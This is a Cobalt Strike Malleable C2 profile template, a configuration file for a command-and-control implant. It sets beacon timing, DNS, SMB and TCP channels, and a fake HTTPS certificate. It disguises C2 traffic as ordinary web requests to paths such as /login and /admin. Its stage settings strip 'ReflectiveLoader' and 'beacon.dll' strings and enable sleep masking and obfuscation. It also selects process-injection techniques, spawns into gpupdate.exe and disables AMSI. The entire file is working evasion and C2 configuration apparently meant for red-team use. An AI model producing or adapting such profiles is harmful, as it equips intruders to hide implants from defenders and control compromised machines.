#clean template profile - no comments, cleaned up, hopefully easier to build new profiles off of.
#xx0hcd

###Global Options###
set sample_name "whatever.profile";

set sleeptime "37500";
set jitter    "33";
set useragent "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/587.38 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36";

#set host_stage "false";

###DNS options###
set dns_idle "8.8.8.8";
set maxdns    "245";
set dns_sleep "0";
set dns_stager_prepend "";
set dns_stager_subhost "";
set dns_max_txt "252";
set dns_ttl "1";

###SMB options###
set pipename "ntsvcs";
set pipename_stager "scerpc";

###TCP options###
set tcp_port "8000";

###SSL Options###
#https-certificate {
    #set keystore "your_store_file.store";
    #set password "your_store_pass";
#}

https-certificate {
    set C "US";
    set CN "whatever.com";
    set L "California";
    set O "whatever LLC.";
    set OU "local.org";
    set ST "CA";
    set validity "365";
}

#code-signer {
    #set keystore "your_keystore.jks";
    #set password "your_password";
    #set alias "server";
#}

###HTTP-Config Block###
http-config {
    set headers "Server, Content-Type";
    header "Content-Type" "text/html;charset=UTF-8";
    header "Server" "nginx";

    set trust_x_forwarded_for "false";
}

###HTTP-GET Block###
http-get {

    set uri "/login /config /admin";

    #set verb "POST";
    
    client {

        header "Host" "whatever.com";
        header "Connection" "close";

	   
    metadata {
        #base64
        base64url;
        #mask;
        #netbios;
        #netbiosu;
        #prepend "TEST123";
        append ".php";

        parameter "file";
        #header "Cookie";
        #uri-append;

        #print;
    }

    parameter "test1" "test2";
    }

    server {
        #header "Server" "nginx";
 
        output {

            netbios;
            #netbiosu;
            #base64;
            #base64url;
            #mask;
            	       
	    prepend "content=";

	    append "\n<meta name=\"msvalidate.01\" content=\"63E628E67E6AD849F4185FA9AA7ABACA\">\n";

            print;
        }
    }
}

###HTTP-Post Block###
http-post {
    
    set uri "/Login /Config /Admin";
    set verb "GET";
    #set verb "POST";

    client {

	header "Host" "whatever.com";
	header "Connection" "close";     
        
        output {
            base64url; 
	    parameter "testParam";
        }

        id {
	    base64url;
	    parameter "id";
            #header "ID-Header":

        }
    }

    server {
        #header "Server" "nginx";

        output {
            netbios;	    
	   
	    prepend "content=";

	    append "\n<meta name=\"msvalidate.01\" content=\"63E628E67E6AD849F4185FA9AA7ABACA\">\n";

            print;
        }
    }
}

###HTTP-Stager Block###
http-stager {

    set uri_x86 "/Console";
    set uri_x64 "/console";

    client {
        header "Host" "whatever.com";
        header "Connection" "close";
	
	#parameter "test1" "test2";
    }

    server {
        #header "Server" "nginx";
	
	output {
	
	    prepend "content=";
	    
	    append "</script>\n";
	    print;
	}

    }
}


###Malleable PE/Stage Block###
stage {
    set checksum        "0";
    set compile_time    "25 Oct 2016 01:57:23";
    set entry_point     "170000";
    #set image_size_x86 "6586368";
    #set image_size_x64 "6586368";
    #set name	        "WWanMM.dll";
    set userwx 	        "false";
    set cleanup	        "true";
    set sleep_mask	"true";
    set stomppe	        "true";
    set obfuscate	"true";
    set rich_header     "";
    
    set sleep_mask "true";

    set module_x86 "wwanmm.dll";
    set module_x64 "wwanmm.dll";

    transform-x86 {
        prepend "\x90\x90\x90";
        strrep "ReflectiveLoader" "";
        strrep "beacon.dll" "";
        }

    transform-x64 {
        prepend "\x90\x90\x90";
        strrep "ReflectiveLoader" "";
        strrep "beacon.x64.dll" "";
        }

    #string "something";
    #data "something";
    stringw "something"; 
}

###Process Inject Block###
process-inject {

    set allocator "NtMapViewOfSection";		

    set min_alloc "16700";

    set userwx "false";  
    
    set startrwx "true";
        
    transform-x86 {
        prepend "\x90\x90\x90";
    }
    transform-x64 {
        prepend "\x90\x90\x90";
    }

    execute {
        CreateThread "ntdll!RtlUserThreadStart";
        CreateThread;
        NtQueueApcThread;
        CreateRemoteThread;
        RtlCreateUserThread;
    }
}

###Post-Ex Block###
post-ex {

    set spawnto_x86 "%windir%\\syswow64\\gpupdate.exe";
    set spawnto_x64 "%windir%\\sysnative\\gpupdate.exe";

    set obfuscate "true";

    set smartinject "true";

    set amsi_disable "true";

}
